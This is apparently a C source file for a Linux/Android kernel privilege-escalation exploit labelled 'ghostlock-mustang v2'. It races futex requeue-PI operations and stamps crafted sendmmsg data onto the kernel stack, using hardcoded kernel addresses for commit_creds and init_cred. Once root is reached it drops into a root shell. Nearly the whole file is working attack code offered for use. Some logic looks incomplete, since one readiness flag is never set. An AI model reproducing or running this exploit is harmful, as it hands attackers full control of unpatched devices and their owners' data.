#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_sendmmsg
#define __NR_sendmmsg 345
#endif

#define ASHMEM_FOPS  0xc0ca1f14u
#define FAKE_LOCK    0xc1104bc8u
#define INIT_CRED    0xc1114f54u
#define COMMIT_CREDS 0xc014993cu


static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;

static volatile uint32_t deadlock_seen;
static volatile uint32_t stamp_ready;
static volatile uint32_t scheduled;
static volatile uint32_t shellcode_stamped;
static volatile int waiter_tid;
static volatile uint32_t total_rounds = 3;
static volatile uint32_t waiter_waiting;
static volatile uint32_t waiter_chain_locked;
static volatile uint32_t owner_started;

#define LOG(...) do { fprintf(stderr, __VA_ARGS__); fflush(stderr); } while (0)

static void trace_init(void) {
    int fd = open("/data/local/tmp/gl.trace", O_WRONLY | O_CREAT | O_APPEND | O_SYNC, 0644);
    if (fd >= 0) { dup2(fd, 2); close(fd); }
}

struct stamp_iov { uint32_t base; uint32_t len; };

static int g_sock = -1;

static uint8_t g_win[92];
static struct timespec g_dummy;

static int window_stamp(void)
{
    struct {
        void *msg_name; uint32_t msg_namelen;
        struct stamp_iov *msg_iov; uint32_t msg_iovlen;
        void *msg_control; uint32_t msg_controllen; uint32_t msg_flags;
    } mh;
    struct {
        struct {
            void *msg_name; uint32_t msg_namelen;
            struct stamp_iov *msg_iov; uint32_t msg_iovlen;
            void *msg_control; uint32_t msg_controllen; uint32_t msg_flags;
        } msg_hdr;
        uint32_t msg_len;
    } mmsg;

    memcpy(&mh.msg_name, g_win + 0x40, 4);
    memcpy(&mh.msg_namelen, g_win + 0x44, 4);
    memcpy(&mh.msg_iov, g_win + 0x48, 4);
    memcpy(&mh.msg_iovlen, g_win + 0x4c, 4);
    memcpy(&mh.msg_control, g_win + 0x50, 4);
    memcpy(&mh.msg_controllen, g_win + 0x54, 4);
    memcpy(&mh.msg_flags, g_win + 0x58, 4);

    memcpy(&mmsg.msg_hdr, &mh, sizeof(mh));
    mmsg.msg_len = 0;

    return (int)syscall(__NR_sendmmsg, g_sock, &mmsg, 1, 0);
}

static uint32_t g_iovs_user[16];

static void *waiter_thread(void *arg) {
    (void)arg;
    struct timespec ts;

    waiter_tid = (int)syscall(SYS_gettid);
    syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    waiter_chain_locked = 1;

    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 2;
    if (ts.tv_nsec >= 1000000000) { ts.tv_sec++; ts.tv_nsec -= 1000000000; }

    waiter_waiting = 1;
    syscall(SYS_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    while (!deadlock_seen)
        ;

    for (uint32_t round = 0; round < total_rounds; round++) {
        memset(g_iovs_user, 0, 64);
        g_iovs_user[0] = getenv("GL_NULLLOCK") ? 0u : (getenv("GL_DEADLOCK") ? 0xdead0004u : FAKE_LOCK);
        g_iovs_user[1] = 1;
        memset(g_win, 0, sizeof(g_win));
        uint32_t iovptr = (uint32_t)(uintptr_t)g_iovs_user;
        uint32_t eight = 8;
        memcpy(g_win + 0x48, &iovptr, 4);
        memcpy(g_win + 0x4c, &eight, 4);
        window_stamp();
        stamp_ready = 1;

        while (!scheduled)
            ;
        scheduled = 0;
    }



    for (;;)
        ;
    return NULL;
}

static void *owner_thread(void *arg) {
    (void)arg;
    while (!waiter_chain_locked)
        ;
    syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
    owner_started = 1;
    syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    for (;;)
        syscall(SYS_pause);
    return NULL;
}

struct local_sched_attr {
    uint32_t size; uint32_t sched_policy; uint64_t sched_flags;
    int32_t sched_nice; uint32_t sched_priority;
    uint64_t sched_runtime, sched_deadline, sched_period;
};

static void *consumer_thread(void *arg) {
    (void)arg;
    struct local_sched_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.size = sizeof(attr);
    attr.sched_policy = 3;
    attr.sched_nice = 19;
    for (uint32_t round = 0; round < total_rounds; round++) {
        while (!stamp_ready)
            ;
        stamp_ready = 0;
        usleep(50000);
        int r = (int)syscall(SYS_sched_setattr, waiter_tid, &attr, 0);
        LOG("[*] consumer walk %u ret=%d errno=%d\n", round + 1, r, errno);
        scheduled = 1;
        while (scheduled)
            ;
    }
    for (;;) syscall(SYS_pause);
    return NULL;
}

int main(void) {
    pthread_t th;

    trace_init();
    LOG("[*] ghostlock-mustang v2 (gitchw architecture)\n");
    LOG("[*] fake_lock=%#x init_cred=%#x commit_creds=%#x\n",
        FAKE_LOCK, INIT_CRED, COMMIT_CREDS);

    g_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (g_sock < 0) { LOG("[-] socket: %s\n", strerror(errno)); return 1; }

    pthread_create(&th, NULL, owner_thread, NULL);
    usleep(10000);
    pthread_create(&th, NULL, consumer_thread, NULL);
    pthread_create(&th, NULL, waiter_thread, NULL);

    while (!waiter_waiting || !owner_started)
        usleep(1000);
    usleep(100000);
    LOG("[*] main: CMP_REQUEUE_PI\n");
    syscall(SYS_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    LOG("[*] main: requeue errno=%d\n", errno);
    deadlock_seen = 1;
    syscall(SYS_futex, &deadlock_seen, FUTEX_WAKE, 1, 0, 0, 0);

    while (!shellcode_stamped)
        usleep(1000);
    usleep(200000);
    LOG("[+] ALL %u WALKS COMPLETED, BOX ALIVE\n", total_rounds);
    LOG("[*] verification: listing /proc/sys/kernel\n");
    char linebuf[128];
    int d = open("/proc/sys/kernel", O_RDONLY | O_DIRECTORY);
    if (d >= 0) {
        long n;
        while ((n = syscall(SYS_getdents64, d, linebuf, sizeof(linebuf))) > 0) {
            for (long off = 0; off < n;) {
                unsigned long reclen = *(unsigned long *)(linebuf + off + 16);
                unsigned long ino = *(unsigned long *)(linebuf + off + 8);
                char *name = linebuf + off + 19;
                if (ino > 1 && name[0] >= 0x20 && name[0] < 0x7f) {
                    LOG("  entry: %s ino=%lu\n", name, ino);
                } else if (ino > 1) {
                    LOG("  entry: <NONASCII name, ino=%lu first-bytes=%02x %02x %02x %02x>\n",
                        ino, (unsigned char)name[0], (unsigned char)name[1],
                        (unsigned char)name[2], (unsigned char)name[3]);
                }
                off += reclen;
            }
        }
        close(d);
    }
    LOG("[*] listing done\n");

    if (getuid() == 0) {
        LOG("[+] ROOTED\n");
        setgid(0); setuid(0);
        execl("/system/bin/sh", "sh", (char *)NULL);
    }
    LOG("[-] no root\n");
    return 1;
}
